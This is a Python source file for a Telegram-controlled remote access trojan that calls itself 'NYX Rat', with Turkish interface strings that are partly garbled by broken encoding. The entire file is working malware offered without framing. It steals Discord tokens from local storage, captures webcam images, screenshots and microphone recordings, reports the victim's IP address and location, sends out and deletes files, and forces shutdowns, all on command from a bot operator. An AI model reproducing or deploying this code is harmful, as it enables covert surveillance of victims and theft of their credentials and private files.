import os
import requests
import subprocess
import pyautogui
import sounddevice
import telebot
import win32gui
import cv2
import webbrowser
import ctypes
import pyttsx3
import sounddevice as sd
from scipy.io.wavfile import write
import re
import win32api
import win32con




bot = telebot.TeleBot("Token")


class Fonkss():

    def __init__(self):
        self.path = os.getenv('AppData')
        self.path_dc = [self.path + '\\Discord', self.path + '\\discordcanary', self.path + '\\discordptb']
        self.TOKEN = []

    def Location_(self):
        r = requests.get("https://ipinfo.io/").json()
        return r["ip"], r["loc"]

    def Message_Bot(self,title, message):
        win32gui.MessageBox(0,message,title,0)

    def WhoAmi(self):
        return os.getenv('username')

    def WebCamFonks(self):
        path = os.getenv("APPDATA")+os.sep+"v.png"
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(path, image)
        camera.release()
        cv2.destroyAllWindows()
        return path

    def OpenUrl(self, url):
        webbrowser.open(url)

    def OpenCd(self):
        ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)

    def Speak_(self,text):
        engine = pyttsx3.init()
        engine.say(text=text)
        engine.runAndWait()


    def Chwall_(self,url):
        path = os.getenv('AppData')+os.sep+"f.png"
        r = requests.get(url=url).content
        with open(path,"wb") as f:
            f.write(r)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


    def Pwd_(self):
        return os.getcwd()

    def Dir_(self):
        return os.listdir()

    def Cd_(self,path):
        return os.chdir(path=path)

    def Token_find(self,Directory):


        Directory += '\\Local Storage\\leveldb'

        for file in os.listdir(Directory):
            if not file.endswith('.log') and not file.endswith('.ldb'):
                continue
            for lin in open(f'{Directory}\\{file}', errors='ignore').readlines():
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for _ in re.findall(regex, lin.strip()):
                        self.TOKEN.append(_)

        return self.TOKEN

    def DC_tOKEN(self):

        for _ in self.path_dc:

            if os.path.exists(_):
                Tokens = self.Token_find(_)

            if len(Tokens) > 0:
                for Token in Tokens:
                    return Token
            else:
                return ("Token Bulunamad??")


fonks = Fonkss()

@bot.message_handler(commands=['start'])
def handle_command(message):
    bot.reply_to(message,"??? NYX Rat Kullan??ma Haz??r ??? "
                         f"\nMerhaba {message.from_user.first_name} ! "
                         f"\n\nKomutlar : /Commands",
                 )

@bot.message_handler(commands=["location"])
def Location(message):
    bot.send_message(message.from_user.id, f"??p : {fonks.Location_()[0]}")
    bot.send_location(message.from_user.id,(fonks.Location_()[1].split(",")[0]),(fonks.Location_()[1].split(",")[1]))


@bot.message_handler(commands=["MessageBox"])
def Message_Box_(message):
    mes = str(message.text)
    message_ = mes[mes.find("x")+1:].split(",")
    try:
        fonks.Message_Bot(message_[0], message_[1])
        bot.reply_to(message, "Pencere Ba??ar??yla A????ld?? ve Kullan??c?? taraf??ndan kapat??ld??")
    except IndexError:
        bot.reply_to(message,"Hata Yanl???? de??er girildi, L??tfen tekrar deneyin ! ")



@bot.message_handler(commands=["Systeminfo"])
def SystemInfo_(message):
    Sysinfo = subprocess.check_output("systeminfo", shell=True)
    bot.reply_to(message, str(Sysinfo))


@bot.message_handler(commands=["Screenshot"])
def ScreenShot_(message):
    screen = pyautogui.screenshot()
    screen.save(os.getenv("APPDATA")+os.sep+"k.png")
    bot.send_photo(message.from_user.id, photo=open(os.getenv("APPDATA")+os.sep+'k.png', "rb"))
    os.remove(os.getenv("APPDATA")+os.sep+"k.png")

@bot.message_handler(commands=["whoami"])
def Whoami_(message):
    bot.reply_to(message,fonks.WhoAmi())


@bot.message_handler(commands=["Webcam"])
def WebCam(message):
    bot.send_photo(message.from_user.id, photo=open(fonks.WebCamFonks(),"rb"))


@bot.message_handler(commands=["OpenUrl"])
def OpenUrl_(message):
    try:
        message_ = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Url A????ld??")
        fonks.OpenUrl(message_)

    except:
        ...
@bot.message_handler(commands=["OpenCdRom"])
def OpenCdRom_(message):
    bot.reply_to(message,"Cd rom a????ld??")
    fonks.OpenCd()

@bot.message_handler(commands=["Speak"])
def Speak_(message):
    try:
        fonks.Speak_(str(message.text).split(",")[1])
        bot.reply_to(message, "Mesaj okundu")
    except:
        ...
@bot.message_handler(commands=["CHWAL"])
def CHWAL_(message):
    try:
        fonks.Chwall_(str(message.text).split(",")[1])
        bot.reply_to(message,"Arka plan resmi de??i??ti")
    except:
        ...

@bot.message_handler(commands=["pwd"])
def Pwd_(message):
    bot.reply_to(message, fonks.Pwd_())


@bot.message_handler(commands=["dir"])
def Dir_(message):
    bot.reply_to(message, str(fonks.Dir_()))

@bot.message_handler(commands=["cd"])
def Cd_(message):
    try:

        fonks.Cd_(str(message.text[message.text.find(" "):]).strip())

        bot.reply_to(message, f"??imdiki dizin : {fonks.Pwd_()}")
    except FileNotFoundError:
        bot.reply_to(message,"Dizin Bulunamad??")
        print(str(message.text[message.text.find(" "):]).strip())

@bot.message_handler(commands=["Download"])
def Download_(message):
    try:
        file = (str(message.text).split(" ")[-1])
        doc = open(f"{file}","rb")
        bot.send_document(message.chat.id , doc)
    except:
        ...


@bot.message_handler(commands=["Delete"])
def Delete_(message):
    try:
        os.remove(str(message.text).split(" ")[-1])
        bot.reply_to(message,"Dosya silindi ")
    except FileNotFoundError:
        bot.reply_to(message,"Dosya ismi girilmedi ")



@bot.message_handler(commands=["shutdown"])
def Shutdown(message):
    bot.reply_to(message,"Bilgisayar Kapan??yor")
    subprocess.call('shutdown -s -f -t 3', shell=True)

@bot.message_handler(commands=["Restart"])
def Restart_(message):
    bot.reply_to(message, "Bilgisayar yeniden ba??lat??lacak")
    subprocess.call('shutdown -r /t 0 /f', shell=True)


@bot.message_handler(commands=["Audio"])
def Audio_(message):
    try:
        frekans = 44100
        sure = int(str(message.text).split(" ")[-1])
        kaydet = sd.rec(int(sure * frekans), samplerate=frekans, channels=2)
        bot.reply_to(message, "Mikrofun kay??t ediliyor")
        sd.wait()
        write("system.wav", frekans, kaydet)
        voice = open('system.wav', 'rb')
        bot.send_voice(message.chat.id, voice)
    except ValueError:
        bot.reply_to(message,"Hata ! Tekrar deneyin ...")
    except sounddevice.PortAudioError:
        bot.reply_to(message, "Mikrofona eri??im sa??lanamad?? ...")



@bot.message_handler(commands=["DCToken"])
def DCToken_(message):
    try:
        bot.reply_to(message, f"Discord Token : \n\n{fonks.DC_tOKEN()}")
        print(fonks.DC_tOKEN())

    except :
        ...


@bot.message_handler(commands=["VoiPow"])
def VoiPow_(message):
    try:
        msg = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Ses y??kseldi.")
        for i in range(int(msg)):
            win32api.keybd_event(win32con.VK_VOLUME_UP, 0)

    except:
        ...


@bot.message_handler(commands=["Commands"])
def Command_List(message):
    bot.reply_to(message,"\n???? Komutlar ????"
                         "\n\n/Screenshot : Ekran G??r??nt??s?? al??r."
                         "\n\n/location : Konum bilgilerini g??sterir."
                         "\n\n/MessageBox : Ekranda mesaj kutusu G??sterir. exp(/MessageBox title , message )."
                         "\n\n/Systeminfo : Sistem ??zelliklerini g??sterir. "
                         "\n\n/Webcam : Kamera'dan resim ??eker."
                         "\n\n/whoami : Kullan??c?? ad??n?? g??sterir."
                         "\n\n/Audio : Verilen saniye kadar mikrofundan ses kay??t eder exp(/Audio 5)"
                         "\n\n/OpenUrl : Url adresini taray??c??da a??ar. exp(/OpenUrl https://test.com/)"
                         "\n\n/OpenCdRom : Cd rom'u a??ar"
                         "\n\n/shutdown : Bilgisayar?? kapat??r."
                         "\n\n/Speak : Verilen mesaji sesli bir ??ekilde okur exp(/Speak , message)"
                         "\n\n/CHWAL : Bilgisayar??n arka plan resmini de??i??tirir exp(/CHWAL , url)"
                         "\n\n/cd : Dosyalar aras??nda gezinme exp(/cd Desktop)"
                         "\n\n/dir : Klas??rde'ki dosyalar?? g??sterir"
                         "\n\n/Download : Belirtilen dosyay?? indirir exp(/Download filename.txt)"
                         "\n\n/pwd : Ge??erli olan dizini g??sterir"
                         "\n\n/Delete : Belirtilen dosyay?? siler exp(/Delete filename.txt)"
                         "\n\n/Restart : Bilgisayar?? yeniden ba??lat??r"
                         "\n\n/DCToken : Kullan??c??n??n discord tokenini g??nderir"
                         "\n\n/VoiPow :Bilgisayar??n sesini y??kseltir exp(/VoiPow 3)"
                )


bot.polling()


